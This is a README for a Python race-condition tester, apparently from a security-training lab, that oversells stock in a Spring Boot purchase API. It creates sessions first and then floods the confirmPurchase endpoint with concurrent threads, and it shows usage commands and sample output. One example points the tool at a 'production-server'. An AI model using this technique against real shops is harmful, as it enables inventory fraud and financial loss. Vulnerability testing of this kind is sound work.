# DIRECT SESSION CONFIRMATION ATTACK - Python Implementation

## Overview

This document provides comprehensive instructions for using the Python-based **DIRECT SESSION CONFIRMATION ATTACK** race condition tester. This advanced testing approach bypasses session locking mechanisms by creating purchase sessions first, then attacking them simultaneously to trigger race conditions in the vulnerable `confirmPurchase` method.

## Table of Contents
- [Attack Strategy](#attack-strategy)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Usage](#usage)
- [Command Line Options](#command-line-options)
- [Understanding Results](#understanding-results)
- [Troubleshooting](#troubleshooting)
- [Examples](#examples)

## Attack Strategy

### Why This Approach Works
The original Spring Boot application uses session-based locking to prevent concurrent purchases, but this only applies during session creation. Once sessions are created, multiple threads can attack them simultaneously, directly targeting the vulnerable `confirmPurchase` method where stock decrement occurs without proper synchronization.

### Two-Phase Attack Process
1. **Phase 1**: Create multiple purchase sessions sequentially (bypasses session locking)
2. **Phase 2**: Attack all sessions simultaneously with concurrent threads (triggers race condition)

### Target Vulnerability
- **Method**: `PurchaseApiController.confirmPurchase()`
- **Lines**: 201-205 (non-atomic stock decrement)
- **Issue**: `currentBook.setStock(currentStock - 1)` allows negative stock

## Prerequisites

### System Requirements
- **Python**: Version 3.6 or higher
- **Network Access**: Connection to the Spring Boot application
- **Valid Credentials**: Login access to the application

### Application Requirements
- Spring Boot application running (default: `http://localhost:8080`)
- Valid user account (default: `alice@secchamp.com` / `password123`)
- Book with available stock in the database

## Installation

### 1. Install Python Dependencies

```bash
# Navigate to the race condition testing directory
cd racecondition

# Install required packages
pip install -r requirements.txt
```

**requirements.txt contents:**
```
# Requirements for race condition testing scripts
# Core HTTP client library for API testing
requests>=2.25.0

# Optional: Additional packages for enhanced testing and development
# pytest>=7.0.0        # For unit testing
# pytest-asyncio>=0.21.0  # For async testing if needed
# aiohttp>=3.8.0       # For async HTTP requests if needed
```

### 2. Verify Installation

```bash
# Check Python version
python --version

# Verify requests library
python -c "import requests; print('requests version:', requests.__version__)"
```

## Usage

### Basic Usage

```bash
# Run with default settings (20 threads, 5 sessions)
python race-test.py

# Aggressive testing (50 threads, 10 sessions)
python race-test.py --threads 50 --sessions 10

# Custom configuration
python race-test.py --threads 30 --sessions 8 --book-id 2 --url http://localhost:8080
```

### Attack Flow

The script follows this execution flow:

1. **Authentication**: Login and obtain JWT token
2. **Stock Check**: Display initial stock level for reference
3. **Session Creation**: Create N purchase sessions sequentially
4. **Simultaneous Attack**: Launch M threads attacking all sessions concurrently
5. **Result Analysis**: Analyze stock levels to detect race conditions

## Command Line Options

| Option | Short | Default | Description |
|--------|-------|---------|-------------|
| `--threads` | `-t` | 20 | Number of concurrent threads attacking sessions |
| `--sessions` | `-s` | 5 | Number of purchase sessions to create and attack |
| `--url` | `-u` | http://localhost:8080 | Base URL of the Spring Boot application |
| `--book-id` | `-b` | 1 | Book ID to test the race condition with |
| `--email` | `-e` | alice@secchamp.com | Login email for authentication |
| `--password` | `-w` | password123 | Login password for authentication |

### Example Commands

```bash
# Basic test with defaults
python race-test.py

# Heavy load testing
python race-test.py --threads 100 --sessions 20

# Test different book
python race-test.py --book-id 2

# Custom server URL
python race-test.py --url http://192.168.1.100:8080

# Different user credentials
python race-test.py --email bob@example.com --password mypass123
```

## Understanding Results

### Successful Race Condition Detection

```
🧪 DIRECT SESSION ATTACK - Race Condition Tester
=======================================================

📝 PHASE 1: Creating 5 purchase sessions...
  ✅ Session 1 created: abc123-def456-ghi789
  ✅ Session 2 created: def456-ghi789-jkl012
  ...

🚀 PHASE 2: Attacking all 5 sessions with 20 concurrent threads!

📊 ATTACK RESULTS:
Total Confirmation Attempts: 100 (20 threads × 5 sessions)
✅ Successful Confirmations: 95
❌ Failed Confirmations: 5

📈 Stock levels observed: -3, -2, -1, 0, 1, 2, 3, 4, 5
📊 Stock range: 5 → -3

🚨 RACE CONDITION DETECTED! Negative stock achieved: -3
🎯 This proves the confirmPurchase method allows overselling!
💥 Multiple threads successfully decremented stock simultaneously
```

### Key Indicators

- **Negative Stock**: Values like -1, -2, -3 prove race condition exists
- **Stock Range**: Shows the spread from highest to lowest observed stock
- **Success Rate**: High success rate with negative stock = confirmed vulnerability
- **Thread × Session Multiplier**: Total attempts = threads × sessions

### No Race Condition Detected

```
📊 ATTACK RESULTS:
Total Confirmation Attempts: 100 (20 threads × 5 sessions)
✅ Successful Confirmations: 100
❌ Failed Confirmations: 0

📈 Stock levels observed: 0, 1, 2, 3, 4, 5
📊 Stock range: 5 → 0

✅ Stock stayed non-negative: 0
⚠️  Race condition may still exist - try increasing threads or sessions
💡 Try: python race-test.py --threads 50 --sessions 10
```

### Error Analysis

When failures occur, the script provides detailed error analysis:

```
🔍 Error Analysis:
  5x: Confirm failed: HTTP 400
  2x: Confirm failed: HTTP 409

📋 First 3 detailed errors:
  Thread 3 Session abc123: Confirm failed: HTTP 400
    Details: Insufficient stock available
  Thread 7 Session def456: Confirm failed: HTTP 409
    Details: Session already confirmed
```

## Troubleshooting

### Common Issues

#### 1. Connection Refused
```
❌ Login failed: Connection refused
```
**Solution**: Ensure Spring Boot application is running on the specified URL.

#### 2. Authentication Failed
```
❌ Login failed: 401 Unauthorized
```
**Solution**: Verify email/password credentials are correct.

#### 3. No Sessions Created
```
❌ No sessions created, cannot proceed with attack
```
**Solution**: Check if book exists and has available stock.

#### 4. All Requests Fail
```
⚠️  No stock levels recorded due to all failures
🔧 Check server status and session validity
```
**Solution**: Verify application is responding and sessions are valid.

### Performance Tuning

- **Increase Threads**: `--threads 50` for more concurrent load
- **More Sessions**: `--sessions 10` to create more attack targets
- **Timeout Adjustment**: Modify `self.session.timeout` in the script if needed

### Debug Mode

For detailed request/response logging, you can modify the script to enable debug output:

```python
import logging
logging.basicConfig(level=logging.DEBUG)
```

## Examples

### Example 1: Basic Race Condition Detection

```bash
$ python race-test.py
🧪 DIRECT SESSION ATTACK - Race Condition Tester
=======================================================

📝 PHASE 1: Creating 5 purchase sessions...
✅ Login OK, token received
📊 Initial stock for Book ID 1: 15

  ✅ Session 1 created: session-123
  ✅ Session 2 created: session-456
  ✅ Session 3 created: session-789
  ✅ Session 4 created: session-ABC
  ✅ Session 5 created: session-DEF

🚀 PHASE 2: Attacking all 5 sessions with 20 concurrent threads!

📊 ATTACK RESULTS:
Total Confirmation Attempts: 100 (20 threads × 5 sessions)
✅ Successful Confirmations: 95
❌ Failed Confirmations: 5

📈 Stock levels observed: -2, -1, 0, 1, 2, 3, 4, 5
📊 Stock range: 5 → -2

🚨 RACE CONDITION DETECTED! Negative stock achieved: -2
🎯 This proves the confirmPurchase method allows overselling!
💥 Multiple threads successfully decremented stock simultaneously
```

### Example 2: Testing Different Books

```bash
$ python race-test.py --book-id 2 --threads 30 --sessions 8
🧪 DIRECT SESSION ATTACK - Race Condition Tester
=======================================================

📝 PHASE 1: Creating 8 purchase sessions...
📊 Initial stock for Book ID 2: 25

🚀 PHASE 2: Attacking all 8 sessions with 30 concurrent threads!

📊 ATTACK RESULTS:
Total Confirmation Attempts: 240 (30 threads × 8 sessions)
✅ Successful Confirmations: 235
❌ Failed Confirmations: 5

📈 Stock levels observed: -5, -4, -3, -2, -1, 0, 1, 2, 3
📊 Stock range: 3 → -5

🚨 RACE CONDITION DETECTED! Negative stock achieved: -5
🎯 This proves the confirmPurchase method allows overselling!
```

### Example 3: Custom Server Configuration

```bash
$ python race-test.py --url http://production-server:8080 --email admin@company.com --password secure123 --threads 50 --sessions 15
```

## Conclusion

The DIRECT SESSION CONFIRMATION ATTACK provides a reliable method to detect race conditions in the Spring Boot purchase system by bypassing session locking mechanisms. The two-phase approach ensures that the vulnerable `confirmPurchase` method is directly targeted with maximum concurrency.

**Key Success Factors:**
- Sufficient thread count for concurrent load
- Adequate session creation to provide attack targets
- Proper application state (running, accessible, stocked)

**Detection Criteria:**
- Negative stock values in results
- High success rate with overselling
- Thread-safe stock decrement failure

---

**Script Version**: 2.0 - Direct Session Attack
**Last Updated**: October 20, 2025
**Tested With**: Python 3.6+, requests 2.25.0+
